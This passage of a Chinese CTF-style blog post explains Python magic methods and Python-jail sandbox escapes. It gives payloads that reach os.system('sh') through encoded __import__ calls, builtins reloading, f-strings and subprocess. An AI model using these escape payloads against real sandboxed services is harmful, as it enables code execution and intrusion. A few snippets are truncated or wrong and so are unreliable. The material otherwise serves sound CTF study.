<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.value &lt; other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__module__</code></strong>：指向定义类的模块名称。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    pass</span><br><span class="line">print(Example.__module__)  # __main__</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__ne__</code></strong>：实现对象的不等性比较，通常由 <code>!=</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __ne__(self, other):</span><br><span class="line">        return self.value != other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__new__</code></strong>：创建并返回一个新对象实例，通常在对象实例化时调用，优先于 <code>__init__</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __new__(cls, *args, **kwargs):</span><br><span class="line">        instance = super().__new__(cls)</span><br><span class="line">        return instance</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__reduce__</code></strong>：用于定义对象序列化的行为，返回一个元组来帮助对象序列化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (self.__class__, (self.value,))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__reduce_ex__</code></strong>：与 <code>__reduce__</code> 类似，但可以支持更多的协议版本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __reduce_ex__(self, protocol):</span><br><span class="line">        return (self.__class__, (self.value,))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__repr__</code></strong>：返回对象的“官方”字符串表示形式。通常可以通过调用 <code>repr(object)</code> 来查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&quot;Example(value=&#123;self.value&#125;)&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__setattr__</code></strong>：当试图设置对象的属性时调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __setattr__(self, name, value):</span><br><span class="line">        print(f&quot;Setting attribute &#123;name&#125; to &#123;value&#125;&quot;)</span><br><span class="line">        super().__setattr__(name, value)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__sizeof__</code></strong>：返回对象占用的内存大小，通常由 <code>sys.getsizeof()</code> 调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __sizeof__(self):</span><br><span class="line">        return object.__sizeof__(self) + sum(sys.getsizeof(v) for v in self.__dict__.values</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__subclasshook__</code></strong>：自定义类的子类检测逻辑。通常由 <code>issubclass()</code> 调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Base:</span><br><span class="line">    @classmethod</span><br><span class="line">    def __subclasshook__(cls, subclass):</span><br><span class="line">        return hasattr(subclass, &#x27;custom_method&#x27;)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__weakref__</code></strong>：用于支持弱引用，如果类中没有 <code>__slots__</code> 属性，则对象的弱引用字典会自动包含此属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import weakref</span><br><span class="line"></span><br><span class="line">class Example:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">obj = Example()</span><br><span class="line">r = weakref.ref(obj)</span><br><span class="line">print(r)  # &lt;weakref at 0x...; to &#x27;Example&#x27; at 0x...&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="Pyjail中常用的魔术方法">Pyjail中常用的魔术方法</h4>
<ul>
<li>
<p><code>__class__</code>能返回当前对象所属的类，例如<code>''.__class__</code>会返回它的类<code>&lt;class 'str'&gt;</code>，对于<code>''.__class__(123)</code>就等价于<code>str(123)</code>。</p>
</li>
<li>
<p><code>__base__</code>能返回当前类的基类，例如<code>str.__base__</code>就是<code>&lt;class 'object'&gt;</code>。</p>
</li>
<li>
<p><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__('os')</code>；</p>
</li>
<li>
<p><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们python一般写的<code>if __name__ == '__main__':</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。</p>
</li>
<li>
<p><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__('os').system('sh')</code>进行RCE（远程代码执行Remote Code Execution）；</p>
</li>
<li>
<p><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的python文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</p>
</li>
<li>
<p><code>_</code>：该变量返回上一次运行的python语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</p>
</li>
</ul>
<h4 id="Pyjail中常用的函数和模块">Pyjail中常用的函数和模块</h4>
<h5 id="import-函数">import 函数</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="exec-eval-函数">exec &amp; eval 函数</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="execfile-函数">execfile 函数</h5>
<p>执行文件，主要用于引入模块来执行命令<br>
python3不存在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;getcwd() <span class="comment"># 等同于pwd</span></span><br></pre></td></tr></table></figure>
<h5 id="timeit-函数-from-timeit-模块">timeit 函数 from timeit 模块</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><code>timeit</code> 是一个 Python 内置模块，用于计时小段代码的执行时间。它提供了一种简单的方法来测量代码的性能，非常适合用于基准测试（benchmarking)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m timeit &quot;x = sum(range(1000))&quot; //这将输出多次执行该代码段的平均时间。</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来计时</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">range</span>(<span class="number">1000</span>)) <span class="comment"># tip sum(iterable, start=0)小用法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 timeit.timeit 计时</span></span><br><span class="line">execution_time = timeit.timeit(<span class="string">&quot;example()&quot;</span>, <span class="built_in">globals</span>=<span class="built_in">globals</span>(), number=<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Execution time: <span class="subst">&#123;execution_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 timeit.timeit() 中传递一段代码字符串时，这段代码默认在一个新的、干净的命名空间中执行。这意味着它无法访问当前脚本中的任何变量、函数或导入的模块。通过指定 globals=globals()，可以让这段代码在当前脚本的全局命名空间中执行，从而访问当前脚本中的变量和函数。</span></span><br></pre></td></tr></table></figure>
<h5 id="platform-模块">platform 模块</h5>
<blockquote>
<p>注意这个只在__py2__生效，py3用了subprocess</p>
</blockquote>
<p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform </span><br><span class="line"><span class="built_in">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="commands-模块">commands 模块</h5>
<blockquote>
<p>这个同样在py2才行</p>
</blockquote>
<p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="built_in">print</span> commands.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> commands.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="subprocess模块">subprocess模块</h5>
<p>py3集大成之模块</p>
<p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call([<span class="string">&#x27;ls&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">subprocess.check_output([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]) <span class="comment"># py2</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">capture_output=True 表示捕获标准输出和标准错误。</span></span><br><span class="line"><span class="string">text=True 表示将输出作为字符串处理，而不是字节。</span></span><br><span class="line"><span class="string">check=True 表示如果命令返回非零退出状态，将引发 subprocess.CalledProcessError 异常。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess  <span class="comment"># py3</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Command output:\n&quot;</span>, result.stdout)</span><br><span class="line"><span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Command failed with error:\n&quot;</span>, e.stderr)</span><br></pre></td></tr></table></figure>
<h5 id="compile-函数">compile 函数</h5>
<p>compile() 函数将一个字符串编译为字节代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">compile</span>(source, filename, mode[, flags[, dont_inherit]])</span><br></pre></td></tr></table></figure>
<ul>
<li>source – 字符串或者AST（Abstract Syntax Trees）对象（抽象语法树）</li>
<li>filename – 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值</li>
<li>mode – 指定编译代码的种类。可以指定为 <code>exec</code> ,<code>eval</code>, <code>single</code>
<ol>
<li><code>exec</code>：可以包含一系列语句（包括复合语句，如函数定义）。</li>
<li><code>eval</code>：只能包含单个表达式。</li>
<li><code>single</code>：可以包含单个语句。</li>
</ol>
</li>
<li>flags – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象</li>
<li>flags和dont_inherit是用来控制编译源码时的标志</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">str</span> = <span class="string">&quot;for i in range(0,10): print(i)&quot;</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="built_in">compile</span>(<span class="built_in">str</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>)   <span class="comment"># 编译为字节代码对象 </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x10141e0b0</span>, file <span class="string">&quot;&quot;</span>, line <span class="number">1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(c)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&quot;3 * 4 + 5&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">compile</span>(<span class="built_in">str</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(a)</span><br><span class="line"><span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">source_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def greet(name):</span></span><br><span class="line"><span class="string">    return &#x27;Hello, &#x27; + name</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(greet(&#x27;World&#x27;))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code_object = <span class="built_in">compile</span>(source_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code_object)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成动态命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要执行的命令</span></span><br><span class="line">command = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 compile 编译命令字符串</span></span><br><span class="line">compiled_command = <span class="built_in">compile</span>(<span class="string">f&quot;subprocess.getoutput(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;)&quot;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 eval 执行编译后的命令</span></span><br><span class="line">output = <span class="built_in">eval</span>(compiled_command)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
<h5 id="fstring（f修饰符-py-3-6）">fstring（f修饰符 py&gt;3.6）</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">F&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有命令行参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All command line arguments:&quot;</span>, sys.argv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印脚本名称</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Script name:&quot;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印传递给脚本的参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Arguments passed to the script:&quot;</span>, sys.argv[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No arguments were passed to the script.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (ctf) ➜  python_test python test.py 1 2 3</span></span><br><span class="line"><span class="comment"># All command line arguments: [&#x27;test.py&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"><span class="comment"># Script name: test.py</span></span><br><span class="line"><span class="comment"># Arguments passed to the script: [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常退出</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非正常退出，返回错误码 1</span></span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块搜索路径</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Module search paths:&quot;</span>, sys.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Module search paths: [&#x27;/home/void2eye/python_test&#x27;, &#x27;/usr/lib/python310.zip&#x27;, &#x27;/usr/lib/python3.10&#x27;, &#x27;/usr/lib/python3.10/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.10/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]</span></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"><span class="comment"># sys.stdin, sys.stdout 和 sys.stderr 分别表示标准输入、标准输出和标准错误流。可以重定向这些流。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重定向标准输出</span></span><br><span class="line">sys.stdout = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will be written to the file output.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复标准输出</span></span><br><span class="line">sys.stdout = sys.__stdout__</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will be printed to the console&quot;</span>)</span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印 Python 版本信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version:&quot;</span>, sys.version)</span><br></pre></td></tr></table></figure>
<h5 id="file-函数">file 函数</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="open-函数">open 函数</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="codecs模块">codecs模块</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="Filetype-函数-from-types-模块">Filetype 函数 from types 模块</h5>
<p>可以用来读取文件</p>
<blockquote>
<p>只能在py2里面用</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="built_in">print</span> types.FileType(<span class="string">&quot;flag&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<h3 id="更加深入的理解Python魔术方法">更加深入的理解Python魔术方法</h3>
<p>我们先看一个报错</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022173651605.png"
                        alt="image-20241022173651605"
                 ></p>
<p>在 Python 中，<code>__init__</code> 方法属于类的实例方法，但它本质上是通过 <code>method-wrapper</code> 或 <code>wrapper_descriptor</code> 实现的特殊方法，而不是常规的函数对象。这就是为什么在访问 <code>__init__</code> 的时候会看到 <code>method-wrapper</code>，并且无法访问像 <code>__globals__</code> 这样的属性。</p>
<p><strong><code>__init__</code> 是一个特殊方法</strong>： <code>__init__</code> 是类的构造函数（初始化方法），它是一个绑定方法，调用时由 Python 自动处理。这种特殊的绑定方法不像普通的函数或方法那样包含 <code>__globals__</code> 属性，因为它是通过内部机制实现的，而不是像常规函数那样存在于全局命名空间。</p>
<p><strong>绑定方法和 <code>method-wrapper</code></strong>： 通过 <code>obj.__init__</code> 访问 <code>__init__</code> 实际上返回的是一个绑定到对象的 <code>method-wrapper</code>，它是 Python 的一种优化机制，用于类的魔法方法。<code>method-wrapper</code> 并不暴露 <code>__globals__</code> 属性，因为它与普通函数不同，不能直接通过 <code>globals()</code> 访问其全局变量。</p>
<p><strong><code>__globals__</code> 仅适用于函数对象</strong>： 只有普通的函数对象（如通过 <code>def</code> 定义的函数）才会有 <code>__globals__</code> 属性，表示它们所在的全局命名空间。Python 的内建方法（如 <code>__init__</code>）是用 <code>C</code> 实现的，属于特殊的 <code>method-wrapper</code>，因此不具备 <code>__globals__</code> 属性。</p>
<blockquote>
<p>重点在第三点，能够有globals属性的必须是def定义的函数（lambda也可以</p>
</blockquote>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174223178.png"
                        alt="image-20241022174223178"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174511612.png"
                        alt="image-20241022174511612"
                 ></p>
<p>很清晰了，函数能直接访问他<code>所在模块</code>的所有变量和属性，你看test3已经访问到了之前定义的匿名函数。</p>
<blockquote>
<p>所以我们的目的一般都是通过访问类或者<code>类</code>的<code>实例</code>来访问函数的globals属性</p>
</blockquote>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174549243.png"
                        alt="image-20241022174549243"
                 ></p>
<ul>
<li>注意跳板为实例的时候，必须得访问__class__来访问到他的类。</li>
</ul>
<h4 id="总结">总结</h4>
<p>Python 的内置魔法方法（如 <code>__init__</code>）是特殊的绑定方法（<code>method-wrapper</code>），不具备 <code>__globals__</code> 属性。</p>
<p>只有通过 <code>def</code> 定义的普通函数和方法才具有 <code>__globals__</code> 属性，表示它们的全局命名空间。</p>
<p>要访问 <code>__globals__</code>，请确保操作的对象是常规的函数或方法对象，而不是内建的魔法方法。</p>
<h3 id="Pyjail绕过方法">Pyjail绕过方法</h3>
<h4 id="内联函数decode">内联函数decode</h4>
<p>因为<strong>import</strong>函数本身是用来动态的导入模块，比如：<code>import(module)</code> 或者 <code>import module</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">__import__</span>(<span class="string">&quot;bf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))       <span class="comment">#import os</span></span><br><span class="line"><span class="comment"># 注意只有py2才能这么写，py3里的str类是没有decode的方法的，且py3的decode改为从字节数据到字符串的转换</span></span><br><span class="line">a.system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>所以py3要么自己写解码脚本，要么用codecs库，其提供了一种编码和解码数据流的接口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a = __import__(codecs.decode(&#x27;bf&#x27;, &#x27;rot_13&#x27;))</span><br></pre></td></tr></table></figure>
<h4 id="builtins函数"><code>builtins函数 </code></h4>
<p>该函数模块中的函数都被自动引入，不需要再单独引入) , <code>dir(__builtins__)</code> 查看剩余可用内置函数</p>
<p>一个模块对象有一个由字典对象实现的命名空间，属性引用被转换为这个字典中的查找，例如，<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测。</p>
<p>所以可以有</p>
<blockquote>
<p>注意，py3中的<code>base64</code> 编码和解码需要处理的是 <code>bytes</code> 对象，而不是 <code>str</code> 对象</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;sh&#x27;</span>)    <span class="comment"># py2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[codecs.decode(<span class="string">b&#x27;X19pbXBvcnRfXw==&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)](codecs.decode(<span class="string">b&#x27;b3M=&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)).system(<span class="string">&#x27;sh&#x27;</span>)    <span class="comment"># py3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line">__builtins__.__dict__[_import__](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="路径引入os等模块">路径引入os等模块</h4>
<p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是 <code>sys.modules[‘os’]=None</code></p>
<p>而因为一般的类Linux系统的python os路径都是<code>/usr/lib/python2.7/os.py</code> ,所以可以通过路径引入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/pythonx.xx/os.py&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="reload模块"><code>reload</code>模块</h4>
<p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这样就无法再引入，但是我们可以用 <code>reload(__builtins__)</code> 重载builtins模块恢复内置函数</p>
<p>但是<strong>reload</strong>本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p>
<p>在可以引用包的情况下，我们还可以使用<code>imp模块</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtins__)</span><br></pre></td></tr></table></figure>
<p>这样就可以得到完整的<code>builtins</code>模块了，需要注意的是需要先<code>import __builtins__ </code>,如果不写的话，虽然<code>builtins</code>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p>
<blockquote>
<p>引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import <code>builtins</code>，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</p>
</blockquote>
<p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>
可以尝试上面的<code>execfile()</code>函数,或者open函数打开文件，exec执行代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="comment"># py2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">&lt;built-in function eval&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; del __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &#x27;eval&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; reload(__builtins__)</span></span><br><span class="line">&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span></span><br><span class="line">&lt;built-in function eval&gt; 